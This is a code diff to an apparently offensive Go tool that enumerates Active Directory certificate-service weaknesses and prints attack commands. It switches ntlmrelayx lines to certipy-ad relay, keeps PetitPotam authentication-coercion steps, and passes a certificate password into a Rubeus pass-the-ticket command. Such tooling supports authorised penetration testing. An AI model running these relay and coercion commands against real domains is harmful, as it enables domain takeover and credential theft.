@@ -293,7 +293,7 @@ func runEnumerate(cmd *cobra.Command) error {
 			fmt.Printf("    Hostname:  %s\n", f.CAHostname)
 			fmt.Printf("    Flags:     0x%08x\n", f.Flags)
 			fmt.Printf("    Encrypts:  %v\n", f.EnforcesEncryption)
-			fmt.Printf("    Exploit:   ntlmrelayx.py -t rpc://%s -rpc-mode ICPR -icpr-ca-name %q -smb2support\n", f.CAHostname, f.CAName)
+			fmt.Printf("    Exploit:   certipy-ad relay -target rpc://%s -ca %q\n", f.CAHostname, f.CAName)
 			fmt.Println()
 		}
 	}
@@ -312,7 +312,8 @@ func runEnumerate(cmd *cobra.Command) error {
 			fmt.Printf("    Hostname:  %s\n", f.CAHostname)
 			fmt.Printf("    DCOM:      %v\n", f.DCOMAccessible)
 			fmt.Printf("    Flags:     0x%08x\n", f.Flags)
-			fmt.Printf("    Exploit:   ntlmrelayx.py -t dcom://%s -dcom-mode ICPR -icpr-ca-name %q -smb2support --template <TEMPLATE>\n", f.CAHostname, f.CAName)
+			fmt.Printf("    Exploit:   certipy-ad relay -target dcom://%s -ca %q\n", f.CAHostname, f.CAName)
+			fmt.Printf("               # Or: impacket-ntlmrelayx -t dcom://%s --adcs -smb2support\n", f.CAHostname)
 			fmt.Println()
 		}
 	}
@@ -647,10 +648,10 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 		if len(esc12Findings) == 0 {
 			return fmt.Errorf("no CAs with accessible DCOM endpoints found")
 		}
-		fmt.Println("\n[!] ESC12 DCOM relay attack — use ntlmrelayx to relay auth to ICertRequest DCOM interface:")
+		fmt.Println("\n[!] ESC12 DCOM relay attack — relay auth to ICertRequest DCOM interface:")
 		for _, f := range esc12Findings {
 			fmt.Printf("\n    Target: %s (%s)\n", f.CAName, f.CAHostname)
-			fmt.Printf("    ntlmrelayx.py -t dcom://%s -dcom-mode ICPR -icpr-ca-name %q -smb2support --template %s\n",
+			fmt.Printf("    certipy-ad relay -target dcom://%s -ca %q -template %s\n",
 				f.CAHostname, f.CAName, templateName)
 			fmt.Printf("    # Then coerce auth: PetitPotam.py <LISTENER_IP> %s\n", cfg.TargetDC)
 		}
@@ -717,7 +718,7 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 			fmt.Printf("    Flags: 0x%x\n", f.Flags)
 		}
 		fmt.Println("\n[*] RPC enrollment without encryption allows relay attacks via ICertPassage:")
-		fmt.Printf("    certipy-ad relay -target rpc://<CA_HOST> -template %s\n", templateName)
+		fmt.Printf("    certipy-ad relay -target rpc://<CA_HOST> -ca <CA_NAME> -template %s\n", templateName)
 		fmt.Printf("    # Then coerce auth: PetitPotam.py <LISTENER_IP> %s\n", cfg.TargetDC)
 		return nil
 	case "14":
@@ -805,7 +806,11 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 		if idx := strings.Index(sam, "@"); idx > 0 {
 			sam = sam[:idx]
 		}
-		fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s /ptt\n", sam, pfxPath)
+		rubeusCmd := fmt.Sprintf("Rubeus.exe asktgt /user:%s /certificate:%s /ptt", sam, pfxPath)
+		if pfxPassword != "" {
+			rubeusCmd += fmt.Sprintf(" /password:%s", pfxPassword)
+		}
+		fmt.Printf("    %s\n", rubeusCmd)
 	}
 	return nil
 }
